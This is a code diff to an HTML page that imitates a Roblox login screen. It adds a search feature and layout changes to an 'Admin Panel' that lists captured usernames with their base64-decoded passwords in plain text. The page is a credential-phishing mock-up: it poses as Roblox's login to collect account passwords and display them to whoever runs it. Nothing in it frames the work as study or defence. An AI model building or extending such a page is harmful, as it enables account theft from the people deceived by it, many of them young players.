@@ -15,6 +15,7 @@
             align-items: center;
             height: 100vh;
             flex-direction: column;
+            overflow: hidden;
         }
         .navbar {
             width: 100%;
@@ -91,6 +92,12 @@
             display: none;
             color: white;
             margin-top: 80px; /* To offset for the navbar */
+            overflow-y: auto;
+            max-height: calc(100vh - 120px);
+        }
+        .search-bar {
+            margin-bottom: 15px;
+            width: 100%;
         }
         .log-list {
             text-align: left;
@@ -100,6 +107,9 @@
         .log-item {
             margin-bottom: 10px;
             text-align: left;
+        }
+        .log-item div {
+            margin-bottom: 5px;
         }
         button {
             background-color: #ff0000;
@@ -117,7 +127,7 @@
 </head>
 <body>
     <div class="navbar">
-        <img src="https://i.pinimg.com/736x/b0/27/a0/b027a0571b62cecc1b32958e41a73908.jpg" alt="Roblox Logo">
+        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png" alt="Roblox Logo">
     </div>
     <div class="container" id="login-container">
         <h2>Login to Roblox</h2>
@@ -137,6 +147,7 @@
     </div>
     <div class="admin-container" id="admin-container">
         <h2>Admin Panel</h2>
+        <input type="text" id="search-bar" class="search-bar" placeholder="Search logs..." onkeyup="searchLogs()">
         <button onclick="clearLogs()">Clear Logs</button>
         <div class="log-list" id="log-list"></div>
         <button onclick="logout()">Logout</button>
@@ -183,19 +194,45 @@
             document.getElementById('login-container').style.display = 'none';
             const adminContainer = document.getElementById('admin-container');
             adminContainer.style.display = 'block';
+            displayLogs();
+        }
+
+        function displayLogs() {
             const logList = document.getElementById('log-list');
             const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
-            logList.innerHTML = logs.map(log => `<div class="log-item">[${log.timestamp}] Username: ${log.username}, Password: ${atob(log.password)}</div>`).join('');
+            logList.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div>[${log.timestamp}]</div>
+                    <div>Username: ${log.username}</div>
+                    <div>Password: ${atob(log.password)}</div>
+                </div>`).join('');
         }
 
         function clearLogs() {
             localStorage.removeItem('loginLogs');
-            document.getElementById('log-list').innerHTML = '';
+            displayLogs();
         }
 
         function logout() {
             document.getElementById('login-container').style.display = 'block';
             document.getElementById('admin-container').style.display = 'none';
+        }
+
+        function searchLogs() {
+            const query = document.getElementById('search-bar').value.toLowerCase();
+            const logList = document.getElementById('log-list');
+            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
+            const filteredLogs = logs.filter(log => 
+                log.username.toLowerCase().includes(query) ||
+                atob(log.password).toLowerCase().includes(query) ||
+                log.timestamp.toLowerCase().includes(query)
+            );
+            logList.innerHTML = filteredLogs.map(log => `
+                <div class="log-item">
+                    <div>[${log.timestamp}]</div>
+                    <div>Username: ${log.username}</div>
+                    <div>Password: ${atob(log.password)}</div>
+                </div>`).join('');
         }
     </script>
 </body>
